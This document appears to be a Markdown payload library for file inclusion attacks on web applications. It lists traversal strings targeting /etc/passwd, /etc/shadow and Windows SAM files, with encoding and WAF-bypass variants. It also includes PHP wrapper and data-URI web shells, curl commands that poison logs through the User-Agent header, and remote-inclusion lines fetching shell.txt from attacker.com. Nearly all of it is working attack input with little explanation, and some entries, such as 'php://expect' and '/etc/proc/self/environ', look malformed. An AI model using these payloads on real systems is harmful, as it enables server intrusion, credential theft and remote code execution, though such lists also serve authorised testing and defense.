# LFI/RFI Payloads Library

## Basic LFI

### Linux Targets
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/group
/etc/proc/self/environ
/proc/self/cmdline
/proc/self/maps
/proc/version
/proc/cmdline
/proc/sched_debug
/proc/mounts
/proc/net/tcp
/proc/net/tcp6
/proc/self/fd/0
/proc/self/fd/1
/proc/self/fd/2
```

### Windows Targets
```
C:\Windows\win.ini
C:\boot.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\repair\sam
C:\Windows\Panther\unattend.xml
C:\Windows\Panther\UnattendGC\catRoot\CATROOT{127_0_1_1}_00000
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

### Common Web Files
```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/../config.php
/var/www/html/../../etc/passwd
/etc/httpd/conf/httpd.conf (Apache)
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
```

## Null Byte Injection
```
/etc/passwd%00
/etc/passwd%00.jpg
/proc/self/environ%00
```

## Path Traversal Variations

### Standard
```
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
/etc/passwd
....//....//....//etc/passwd
..\/..\/..\/etc/passwd
```

### Encoded
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Unicode
```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

### Double URL
```
%252e%252e%252fetc%252fpasswd
%2e%2e%252fetc%252fpasswd
```

### Path truncation
```
/etc/passwd....../............/
/etc/passwd/././././././././././
```

## Wrapper Payloads

### PHP filters
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/resource=index.php
php://filter/convert.base64-encode/index.php
```

### Data URIs
```
data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data:text/plain,<?php system($_GET['cmd']); ?>
```

### Expect wrapper (PHP)
```
expect://whoami
expect://id
expect://ls
```

### Input wrapper
```
php://input
POST: <?php system($_GET['cmd']); ?>
```

### ZIP/JAR wrappers
```
zip://file:///var/www/html/shell.zip#shell.php
jar://file:///var/www/html/shell.jar!/shell.php
```

## Log Poisoning

### Apache
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error_log
```

### SSH
```
/var/log/auth.log
/var/log/secure
```

### Inject via User-Agent
```
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com
```

## RFI (Remote File Inclusion)

### Basic RFI
```
?page=http://attacker.com/shell.txt
?file=http://attacker.com/shell.txt
?include=http://attacker.com/shell.txt
```

### With null byte
```
?page=http://attacker.com/shell.txt%00
```

### HTTPS
```
?page=https://attacker.com/shell.txt
```

### DNS rebinding
```
?page=http://attacker-controlled-domain.com
# Set up DNS to point to 127.0.0.1 after validation
```

## Remote Code Execution via LFI

### Via /proc/self/environ
```
# Proc PID
/proc/self/environ
# Look for procfd maps
/proc/self/fd/0

# Inject via User-Agent when target logs it
curl -H "User-Agent: <?php system('whoami'); ?>" http://target.com
```

### Via PHP sessions
```
/var/lib/php/sessions/sess_[PHPSESSID]
# Inject payload in session file via parameter
```

### Via PHP temp files
```
/tmp/php[xxxxx]
# Include immediately after upload
```

### Via log files
```
# Poison log with PHP code
curl -A "<?php system('whoami'); ?>" http://target.com/path?file=/var/log/apache2/access.log
# Then include the log
```

## Common Vulnerable Parameters

```
?page=
?file=
?include=
?template=
?doc=
?path=
?dir=
?url=
?base=
?config=
?load=
?src=
```

## WAF Bypass

### Case variation
```
/Etc/PassWd
/etc/passwd
/etc/paSSwd
```

### Path double encoding
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

###路径分隔符
```
/././././etc/passwd
...\...\...\etc\passwd
....\/....\/....\/etc/passwd
```

### Null bytes
```
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd\x00
```

## PHP Wrappers in Detail

### php://filter
```
php://filter/read=convert.base64-encode/resource=index.php
# Decode output to read source
```

### php://input
```
POST /index.php?file=php://input
Body: <?php system('whoami'); ?>
```

### php://expect
```
/index.php?file=php://expect://whoami
```

### phar://
```
phar://archive.zip/shell.php
```

### zip://
```
zip://shell.zip#shell.php
```

## Quick Reference

| Technique | Payloads |
|-----------|----------|
| Basic | `../../etc/passwd` |
| Null byte | `etc/passwd%00` |
| Base64 wrapper | `php://filter/read=convert.base64-encode/resource=file` |
| RFI | `?file=http://attacker.com/shell.txt` |
| Log poisoning | Poison User-Agent, include /var/log/apache2/access.log |